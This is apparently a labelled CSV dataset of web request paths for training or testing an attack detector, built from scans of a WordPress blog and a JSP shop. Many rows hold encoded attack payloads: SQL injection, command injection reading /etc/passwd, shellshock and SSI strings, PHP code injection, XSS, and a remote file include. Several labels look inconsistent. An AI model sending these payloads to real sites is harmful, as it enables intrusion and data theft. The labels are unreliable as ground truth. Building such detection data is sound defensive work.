text,label
/blog/wp-includes/js/mediaelement%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26/mediaelementplayer-legacy.min.css?ver=4.2.6-78496d1,0
/overview_on/,0
/blog/wp-includes/js/imgareaselect/imgareaselect.css%27+AND+%271%27%3D%271?ver=0.9.8,1
/blog/wp-includes/js%27+AND+%271%27%3D%271/jquery,1
/blog/index.php/8501779237819759495.owasp.org/feed/feed,0
/blog%27+OR+%271%27%3D%271%27+--+/index.php/2020/04/04/rerum-soluta-et-quis-excepturi-labore/embed,1
/blog/wp-includes/js/media-audiovideo.min.swp.js,0
/blog/wp-content/uploads/2020+%2F+sleep%2815%29+/04/7c651b11-3631-3f9e-b728-dc11efe811c7.png,0
/blog0W45pz4p/index.php/search/feed/rss2,0
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum%27%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/embed,1
4626,0
/blog/index.php/my-account/lost-password/ user_login=pluckyMacaw2&ur_reset_password=true&_wpnonce=4b87c6adf6&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Flost-password%2F,1
/blog%27+AND+%271%27%3D%271/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4,1
/blog/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js?ver=1.0+and+0+in+%28select+sleep%2815%29+%29+--+,1
/blog/%00/plugins/user-registration/assets/js/inputmask/jquery.inputmask.bundle.min.js?ver=4.0.0-beta.58,0
/blog/index.php/my-account/edit-profile/ profile-pic-url=&profile-default-image=http%3A%2F%2F1.gravatar.com%2Favatar%2F14d5b5665405f8accb4e5f2fa274cd44%3Fs%3D96%26d%3Dmm%26r%3Dg&profile-pic=test_file.txt&user_registration_first_name=rafael&user_registration_user_login=rafael&user_registration_last_name=gracia&user_registration_user_email=rafael%40gmail.com%22%29+UNION+ALL+select+NULL+--+&_wpnonce=5c88b58e23&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2F&save_account_details=Save+changes&action=save_profile_details,1
/blog/wp-login.php?action=register user_login=HtTpS%3A%2F%2F8501779237819759495.owasp.org&user_email=foo-bar%40example.com&redirect_to=&wp-submit=Register,0
//wp-includes/css/media-views.min.css?ver=4.9.5,0
/blog/index.php/2020/04/page/2/?-s,0
/blog/wp-content/themes/twentyseventeen/assets/js/navigation.js%29+UNION+ALL+select+NULL+--+?ver=1.0,1
/examples/jsp/jsp2/el/query.cgi,0
/blog+AND+1%3D1+--+/wp-includes/css/wp-embed-template-ie.min.css?ver=4.9.5,1
/blog/index.php/2020%26cat+%2Fetc%2Fpasswd%26/04/04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis,0
/blog%27+and+0+in+%28select+sleep%2815%29+%29+--+/index.php/nihil-dolorem-molestiae-recusandae-corrupti-qui-alias/embed,1
/blog/wp-includes/js/media-models.min.js?ver=%2B,0
/blog/index.php/2020/%2F%2F8501779237819759495.owasp.org/22/quidem-rerum-sit-doloribus-quia-eum/feed,0
/blog/wp-content/uploads/2020%22%3Bcat+%2Fetc%2Fpasswd%3B%22/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-32x32.jpg,0
/blog/wp-includes/js/imgareaselect/imgareaselect.swp.css,0
/blog/index.php/2020/03%27+AND+9471%3D9471--+-/23,1
/blog/index.php/2020/04%26%26cat+%2Fetc%2Fpasswd/04/labore-pariatur-amet-quam/feed,0
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL--+-,1
/HtTp%3A%2F%2F8501779237819759495.owasp.org/wp-content/uploads/2020/04/ca053e21-2e95-34b7-a64b-a8ef08169a27-1024x682.jpg,0
/blog/index.php%27+OR+%271%27%3D%271/et-vel-qui-explicabo-autem-rerum-nisi/feed,1
/blog/%2B/qui-enim-sunt-minima-sit/embed,0
/blog%27+AND+2849%3D2849--+-/index.php/2020/03/29/distinctio-sequi-officiis-occaecati/embed,1
/blog/wp-content/uploads/2020%27/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3.jpg,1
/blog/wp-content/uploads/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db.jpg%22+and+0+in+%28select+sleep%2815%29+%29+--+,1
/blog/wp-content/zApPX2245sS/2020/04/7eb06ef2-3782-3e6a-bb62-c705e86b2eee.jpg,0
/blog/wp-content%60cat+%2Fetc%2Fpasswd%60/plugins/user-registration/assets/js,0
/blog/index.php%27%3Bcat+%2Fetc%2Fpasswd%3B%27/sample-page/ut-aspernatur-est-dolores/feed,0
/blog/index.php/sample-page/amet-et-deleniti-tenetur-minima/embed/,0
/blog/index.php/2020/page/http%3A%2F%2F8501779237819759495.owasp.org,0
/blog/index.php/2020/03/23%29+UNION+ALL+select+NULL+--+/fuga-aut-recusandae-sed-dolor-quia/embed,1
/blog/wp-content/uploads/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063_backup.png,0
/blog/wp-content/uploads/2020/04%25/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3.jpg,0
/css/wp-content/themes/twentyseventeen/assets/css,0
/blog%27%22/index.php/sample-page/ut-aspernatur-est-dolores,1
/blog/index.php/2020/04/04+DESC++--+/voluptas-alias-ut-iure-dicta-aliquid-corrupti,1
/blog/wp-content/uploads/zApPX2256sS/04/814f0d47-97c4-3681-b8a4-2cd7f3a93119.jpg,0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/embed%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-,1
/blog/index.php/2020%29+PROCEDURE+ANALYSE%28EXTRACTVALUE%285207%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28CASE+WHEN+%285207%3D5207%29+THEN+1+ELSE+0+END%29%29%2C0x3a6172743a%29%29%2C1%29+AND+%285425%3D5425/03/23,1
/blog/%40/author/barton03/feed,0
/blog/wp-content/uploads/2020/04+%2F+sleep%2815%29+/ff237aac-eda3-37f9-8529-2cbfc90951b2-1024x682.jpg,0
/blog%27%3Bcat+%2Fetc%2Fpasswd%3B%27/index.php/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem,0
/blog/index.php+OR+1%3D1/sample-page/nulla-quisquam-est-ut-nemo,1
/blog/index.php%28/2020/04/04/consequatur-ad-error-quidem/feed,1
/senseweb-tm/,0
/blog/wp-content/uploads/0W45pz4p/04/11020b88-e0d1-33fa-b269-b7e9f495b02b-1024x682.jpg,0
/blog/wp-content/uploads%22+AND+%221%22%3D%221%22+--+/2020/04/755e6d4b-39f2-3314-89a0-c9a4d1bc3143-1024x682.jpg,1
/blog%27%26cat+%2Fetc%2Fpasswd%26%27/wp-includes/js/wp-embed.min.js?ver=4.9.5,0
/blog/wp-content/plugins/user-registration/assets/js/frontend/user-registration.min.js?ver=1.8.2.1+or+0+in+%28select+sleep%2815%29+%29+--+,1
/blog/wp-content/uploads%7C%7Ccat+%2Fetc%2Fpasswd/2020/04/38536cfd-4e8b-3340-b4c4-af387cc163a8-1024x682.jpg,0
/blog/index.php/author/rosenbaum-lisette%22+AND+%221%22%3D%221,1
/blog/wp-content/uploads/2020%22+or+0+in+%28select+sleep%2815%29+%29+--+/04/ff237aac-eda3-37f9-8529-2cbfc90951b2-1024x682.jpg,1
/blog/index.php/2020%22%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog/index.php/tag%22%3Bcat+%2Fetc%2Fpasswd%3B%22/nihil-ut-deleniti-est/feed,0
/tienda1/publico/autenticar.jsp?modo=entrar&login=blann&pwd=brear&remember=off&b1a=entrar,1
/blog/wp-content/uploads/2020/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a-300x239.png.2,0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia%22+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL--+-/embed,1
/blog/wp-admin/load-styles.php?c=0%22+%2F+sleep%2815%29+%2F+%22&dir=ltr&load%5B%5D=dashicons%2Cbuttons%2Cforms%2Cl10n%2Clogin&ver=4.9.5,1
/blog%22%26cat+%2Fetc%2Fpasswd%26%22/index.php/author/rosenbaum-lisette/feed,0
/blog/wp-content/plugins/user-registration/assets/js/jquery-tiptip/jquery.tipTip.min.3,0
/blog/index.php/2020/03%27+OR+%271%27%3D%271/22/quidem-rerum-sit-doloribus-quia-eum/feed,1
/blog%29%3B%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29DCbN%29%23/index.php/2020/03/29/distinctio-sequi-officiis-occaecati,1
/%00/wp-content/uploads/2020/04/65521cc1-512f-3af5-a40c-ad52a8de6f29-300x240.png,0
/blog/wp-content/plugins/user-registration/assets/css+OR+1%3D1,1
/blog%3B/index.php/nihil-dolorem-molestiae-recusandae-corrupti-qui-alias/feed,1
/blog/index.php/my-account/ username=rafael%27+AND+%271%27%3D%271%27+--+&password=espa%C3%B1a01&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2F&login=Login&redirect=,1
/tienda1/publico/caracteristicas.jsp?id='+delete+from+users,1
/blog%25%27%29+ORDER+BY+1--+-/index.php/2020/03/29,1
/blog/c%3A%5C/uploads/2020/04/02020950-6e37-3272-9dbf-3093969e3563.jpg,0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia%27%29+AND+6075%3D6075+AND+%28%27IYhC%27%3D%27IYhC/feed,1
/blog/wp-content/uploads/2020/04/11020b88-e0d1-33fa-b269-b7e9f495b02b-1024x682.jpg%27%3Bsleep+15%3B%27,1
/blog/wp-includes/js/8501779237819759495.owasp.org/wp-mediaelement.min.css?ver=4.9.5,0
/blog/wp-comments-post.php comment=&author=superiorGnu0&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=Post+Comment&comment_post_ID=27&comment_parent=0,0
/tienda1/publico/autenticar.jsp?modo=entrar&login=coloads&pwda=riosellano&remember=off&b1=entrar,1
/blog/index.php/2020/03/22+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog/index.php/author/barton03/?-s,0
/outerwear/,0
/blog/index.php/https%3A%2F%2F8501779237819759495.owasp.org/03/23/fuga-aut-recusandae-sed-dolor-quia/embed,0
/blog/wp-content/uploads/2020%7C%7Ccat+%2Fetc%2Fpasswd/04/02020950-6e37-3272-9dbf-3093969e3563-300x200.jpg,0
/blog%22%26cat+%2Fetc%2Fpasswd%26%22/index.php/nihil-dolorem-molestiae-recusandae-corrupti-qui-alias/feed,0
/%3C%21--/index.php/2020/04/04/voluptas-alias-ut-iure-dicta-aliquid-corrupti/embed,1
/blog/wp-includes/js/mediaelement/mediaelement-and-player.min.js%22%3Bcat+%2Fetc%2Fpasswd%3B%22?ver=4.2.6-78496d1,0
/blog/index.php/my-account/edit-profile/?mode=grid username=decimalLard3&password=DyScIv&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2F%3Fmode%3Dgrid&login=Login&redirect=&rememberme=forever+AND+1%3D1,1
/any%253F%250ASet-cookie%253A%2BTamper%253Db2ce21d2-2515-4f0e-80f2-7e50ab88131c/index.php/my-account/edit-profile/%7B%7B%20attachment.url,1
/blog/wp-content/uploads/2020/04/ff237aac-eda3-37f9-8529-2cbfc90951b2.orig,0
/blog/index.php%25%22++--+/tag/hic-quod-et-odit/feed,1
/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=100&cantidad=12&b1=a�adir+al+carrito,0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia%25%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/blog/wp-content/uploads/%28/04/e3780f73-5198-35c8-8ece-d2d4feda884e.jpg,1
/blog/wp-content/uploads/2020/04/7eb06ef2-3782-3e6a-bb62-c705e86b2eee-300x200.jpg%25,0
/javascript/showpost.jhtml,0
/blog/index.php/%2Fpost.php/edit-profile/post.php?action=edit&post=%7B%7B%20data.id%20%7D%7D,0
/blog/index.php/tag/autem-vel-nostrum-enim%22+%2F+sleep%2815%29+%2F+%22/feed,0
/blog/index.php%27+OR+%271%27%3D%271/2020/03/29,1
/blog/wp-includes/js/zApPX2744sS?ver=4.9.5,0
/tienda1/publico/autenticar.jsp?modo=entrar&login=yanna&pwd=jaquimero&remember=on&b1=entrar,0
/tienda1/imagenes/.old,1
/blog/index.php%27%29+AND+ROW%284003%2C7720%29%3E%28SELECT+COUNT%28*%29%2CCONCAT%280x3a727a613a%2C%28SELECT+%28ELT%284003%3D4003%2C1%29%29%29%2C0x3a6172743a%2CFLOOR%28RAND%280%29*2%29%29x+FROM+%28SELECT+7818+UNION+SELECT+5164+UNION+SELECT+8879+UNION+SELECT+9322%29a+GROUP+BY+x%29+AND+%28%27OzEp%27+LIKE+%27OzEp/2020/03/23,1
/blog%3Bcat+%2Fetc%2Fpasswd%3B/wp-includes/css,0
/blog/wp-content/plugins/user-registration%22%3Bsleep+15%3B%22/assets/js/frontend/jquery.validate.min.js?ver=1.15.1,1
/blog/wp-content/uploads/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db.jpg%27+where+0+in+%28select+sleep%2815%29+%29+--+,1
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/blog/wp-includes/zApPX2483sS/admin-bar.min.js?ver=4.9.5,0
/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39/&cantidad=20&b1=a�adir+al+carrito,1
/blog/index.php%27+AND+5711%3D5711+AND+%27JcKs%27%3D%27JcKs/2020/03/27,1
/blog/wp-content/uploads/2020/04/11020b88-e0d1-33fa-b269-b7e9f495b02b-1024x682.jpg%25%27++--+,1
/blog/wp-content/uploads/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063-300x240.png%22+AND+%221%22%3D%221%22+--+,1
/blog/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15/nihil-dolorem-molestiae-recusandae-corrupti-qui-alias/feed,0
/blog/index.php/my-account/edit-password/ password_current=_yAvHdH&password_1=_yAvHdH%27+or+0+in+%28select+sleep%2815%29+%29+--+&password_2=_yAvHdH&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,1
/blog/index.php/2020%27%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/03/22/quidem-rerum-sit-doloribus-quia-eum,1
/blog/index.php/registration/ first_name=ZAP&user_login=affectedChowder6&user_pass=ZAP&user_confirm_password=CX5TDjz&last_name=ZAP&user_email=foo-bar%40example.com&user_confirm_email=foo-bar%40example.com&ur-user-form-id=97&ur-redirect-url=&ur_frontend_form_nonce=371e07a3bf,1
"1"" where 7796=7796;select case when 7717=7717 then 1 else null end--",1
/%29/index.php/2020,1
/blog/wp-login.php?action=register user_login=8501779237819759495.owasp.org&user_email=foo-bar%40example.com&redirect_to=&wp-submit=Register,0
/blog/wp-includes/js/jquery/%2Fcore.min.js/core.min.js?ver=1.11.4,0
/blog/wp-content/uploads/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063.png%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26,0
/blog+OR+1%3D1+--+/wp-content/uploads/2020/04/ca053e21-2e95-34b7-a64b-a8ef08169a27.jpg,1
/blog/wp-content/plugins/user-registration/assets/css/user-registration.css%27+AND+%271%27%3D%271?ver=1.8.2.1,1
/blog/wp-content/uploads/%2F/04/6182beef-7947-3c05-887f-c6de1c49f824.png,0
/blog/index.php/2020%22%29+AND+8234%3D8234+AND+%28%22Kenp%22%3D%22Kenp/03/29/distinctio-sequi-officiis-occaecati,1
/blog/wp-content/http%3A%5C%5C8501779237819759495.owasp.org/2020/04/ca053e21-2e95-34b7-a64b-a8ef08169a27-1024x682.jpg,0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/HtTp%3A%2F%2F8501779237819759495.owasp.org,0
/blog/%2F%2F8501779237819759495.owasp.org/2020/04/04,0
"/blog/wp-admin/load-scripts.php?c=0&load%5B%5D=hoverIntent,common,admin-bar,wp-ajax-response,jquery-color,wp-lists,quicktags,jquery-query,admin-comments,svg-painter,wp-auth-ch&load%5B%5D=eck,wp-a11y,wplink,jquery-ui-core,jquery-ui-widget,jquery-ui-position,jquery-ui-menu,jquery-ui-autocomplete&ver=4.9.5",1
/blog/wp-login.php?action=register user_login=finickyTermite9&user_email=foo-bar%40example.com&redirect_to=&wp-submit=Register,0
/blog/index.php/my-account/lost-password/ user_login=wrathfulBittern2&ur_reset_password=true&_wpnonce=4b87c6adf6&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Flost-password%2F,0
/blog/index.php/my-account%2BUNION%2BALL%2Bselect%2BNULL%2B--%2B/edit-profile/%7B%7B%20attachment.thumbnail.url%20%7D%7D,1
/blog/wp-content/uploads/2020/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9.2,0
/blog/index.php/2020/04/04%27+AND+%271%27%3D%271%27+--+/tempore-odit-cupiditate-voluptas-laudantium-et-facilis,1
/blog/index.php/2020/04/04%27%26cat+%2Fetc%2Fpasswd%26%27/tempore-odit-cupiditate-voluptas-laudantium-et-facilis/feed,0
/blog/wp-includes/js/imgareaselect/imgareaselect.css%22%3Bcat+%2Fetc%2Fpasswd%3B%22?ver=0.9.8,0
/%2F/wp-content/plugins/user-registration/assets/css/sweetalert2/sweetalert2.min.css?ver=8.17.1,0
/blog%29/index.php/2020/04/04/rerum-soluta-et-quis-excepturi-labore,1
/blog/HtTp%3A%2F%2F8501779237819759495.owasp.org/uploads/2020/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a.png,0
/blog/index.php/2020/04/04%27+UNION+ALL+select+NULL+--+/ipsa-repellat-dignissimos-laudantium,1
/john_cleese/,0
/blog/index.php%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/2020/03/29,1
/blog%22%3Bsleep+15%3B%22/wp-content/uploads/2020/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a-300x239.png,1
/110656/,0
/blog/wp-content/themes+OR+1%3D1+--+/twentyseventeen,1
/blog/index.php/2020/04/04%22%26cat+%2Fetc%2Fpasswd%26%22/voluptatum-reprehenderit-maiores-ab-sequi-quaerat,0
/blog/index.php/2020%29+ORDER+BY+1--+-/03/23/fuga-aut-recusandae-sed-dolor-quia,1
/%00/index.php/search/setting/feed,0
/cgi-bin/snpfiltered.pl?t=c&u=<script>foo</script>,1
/5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/index.php/2020/03/27,0
/blog%22+UNION+ALL+select+NULL+--+/wp-admin/profile.php,1
/rundfunk/,0
/blog/index.php/sample-page/ut-aspernatur-est-dolores/embed%22+OR+%221%22%3D%221,1
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum%25%27+UNION+ALL+SELECT+NULL%2CNULL%23,1
/blog/index.php/2020/03%25%27+AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29mEJk%29+AND+%27%25%27%3D%27/23/fuga-aut-recusandae-sed-dolor-quia/embed,1
/blog/wp-includes/js/underscore.min.js%3Bcat+%2Fetc%2Fpasswd%3B?ver=1.8.3,0
/blog/index.php/2020/zApPX429sS/04/rerum-soluta-et-quis-excepturi-labore/embed,0
/blog/wp-content/uploads/2020/04/f74331ba-6a7e-37cc-aefe-7026be7b0c0b.png0W45pz4p,0
/blog/index.php/2020/03%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/29,1
/blog%27%29+AND+9355%3D9355+AND+%28%27MkHy%27%3D%27MkHy/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia,1
/%5C%5C8501779237819759495.owasp.org/wp-includes/css/admin-bar.min.css?ver=4.9.5,0
/tienda1/publico/pagar.jsp?modo=insertar&precio=7748&b1=confirmar,0
/include/scripts/send_email_cache.php?dir=http://192.168.202.96:8080/txenjrxf3?,1
/b1190792/,0
/blog/wp-includes/js/c%3A%2F,0
/blog/index.php/est-reiciendis-laboriosam-aperiam-adipisci-non+ASC++--+,1
/blog%26cat+%2Fetc%2Fpasswd%26/index.php/2020/03,0
/blog/index.php/2020/03+PROCEDURE+ANALYSE%28EXTRACTVALUE%285110%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28CASE+WHEN+%285110%3D5110%29+THEN+1+ELSE+0+END%29%29%2C0x3a6172743a%29%29%2C1%29--+olqB/22/quidem-rerum-sit-doloribus-quia-eum/feed,1
/blog/index.php/2020/04/04%25/labore-pariatur-amet-quam/embed,0
/blog/index.php/2020%29%29+AND+4666%3D9734--+-/03/23/fuga-aut-recusandae-sed-dolor-quia,1
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/https%3A%5C%5C8501779237819759495.owasp.org/wp-content/uploads/2020/04/6182beef-7947-3c05-887f-c6de1c49f824.png,0
/blog/index.php/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/03/23/fuga-aut-recusandae-sed-dolor-quia,0
/car tuning 9 cd-2/,0
/blog/wp-content/uploads/2020/04%27+UNION+ALL+select+NULL+--+/27f17687-adda-3ce6-9767-0037ea74eec2.png,1
/blog/index.php%22+RLIKE+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29RByn%29+AND+%22PZRe%22%3D%22PZRe/2020,1
/ciscocomplete/,0
/blog/index.php/tag%27+AND+%271%27%3D%271%27+--+/nihil-alias-ab,1
/blog%27%29%3B%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29MTlh%29+AND+%28%27mOTZ%27+LIKE+%27mOTZ/index.php/2020/03/23,1
/blog%27+AND+%271%27%3D%271/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=4.2.6-78496d1,1
/blog/%7C/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem,0
/007155/,0
/blog/wp-content/uploads/2020/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9.jpg.bac,0
/blog/index.php/2020/03%22+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-,1
/blog/index.php/2020/03/HtTpS%3A%2F%2F8501779237819759495.owasp.org/fuga-aut-recusandae-sed-dolor-quia/embed,0
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed%22+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-,1
mathieu,0
/blog/index.php/et-vel-qui-explicabo-autem-rerum-nisi/5779454170712797956,0
/blog/wp-includes/js/mediaelement/http%3A%2F%2F8501779237819759495.owasp.org?ver=4.9.5,0
/blog/wp-content/plugins/Set-cookie%3A+Tamper%3D299c6b90-f4df-40c9-ab1d-5aa335dfcbbe/assets/css/sweetalert2/sweetalert2.min.css?ver=8.17.1,0
/blog/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/aliquam-odio-a-labore-magnam-quam-quis/feed,0
/blog/wp-includes/js%22%26cat+%2Fetc%2Fpasswd%26%22/media-editor.min.js?ver=4.9.5,0
/blog/wp-comments-post.php comment=&author=aloofCheetah4&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=Post+Comment&comment_post_ID=83&comment_parent=0,0
/0W45pz4p/index.php/nobis-tenetur-exercitationem-similique/embed,0
/blog/index.php/2020/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15/04/voluptas-alias-ut-iure-dicta-aliquid-corrupti/embed,0
/blog%22%26sleep+15%26%22/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur,1
/blog/index.php/my-account%27%29+UNION+ALL+select+NULL+--+/lost-password user_login=dejectedFlamingo1&ur_reset_password=true&_wpnonce=4b87c6adf6&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Flost-password%2F,1
/blog/index.php/search/feed/URL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27,0
/blog/wp-includes/js/underscore.min.js%27%22?ver=1.8.3,1
/blog/index.php%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed,1
/blog/wp-login.php?reauth=1&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fwp-admin%2Fprofile.phpXYZABCDEFGHIJ,0
/blog/wp-includes/js%27%29+UNION+ALL+select+NULL+--+/media-views.min.js?ver=4.9.5,1
/blog/index.php/aliquam-odio-a-labore-magnam-quam-quis%28,1
/blog/index.php/%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522/edit-profile/%7B%7B%20data.size.url%20%7D%7D,1
/blog/index.php/est-reiciendis-laboriosam-aperiam-adipisci-non%26%26cat+%2Fetc%2Fpasswd,0
/blog/index.php/%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C/edit-profile/%7B%7B%20data.image.src%20%7D%7D,1
/blog/wp-content/uploads/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063.png%27%26cat+%2Fetc%2Fpasswd%26%27,0
/blog/index.php/sample-page%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26/feed,0
/blog/index.php/2020/04/04/ipsa-repellat-dignissimos-laudantium/feed%7C%7Ccat+%2Fetc%2Fpasswd,0
munera,0
/5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/wp-content/uploads/2020/04/b476e717-efec-3b0d-80e9-13c6400a7702-300x240.png,0
/blog/wp-content/%28/2020/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a.png,1
/blog/wp-includes/http%3A%5C%5C8501779237819759495.owasp.org/jquery/jquery.js?ver=1.12.4,0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia%22%29+AND+8025%3D8025+AND+%28%22aOix%22%3D%22aOix,1
"c/ san salvador, 34, 10?f",0
/blog/index.php%29+UNION+ALL+select+NULL+--+/2020/04/04/hic-porro-nihil-non-rerum/embed,1
/blog/wp-content/uploads/2020/04/5ss7effss1v2tr3ou7198jtggp8fiol5ltr26wec,0
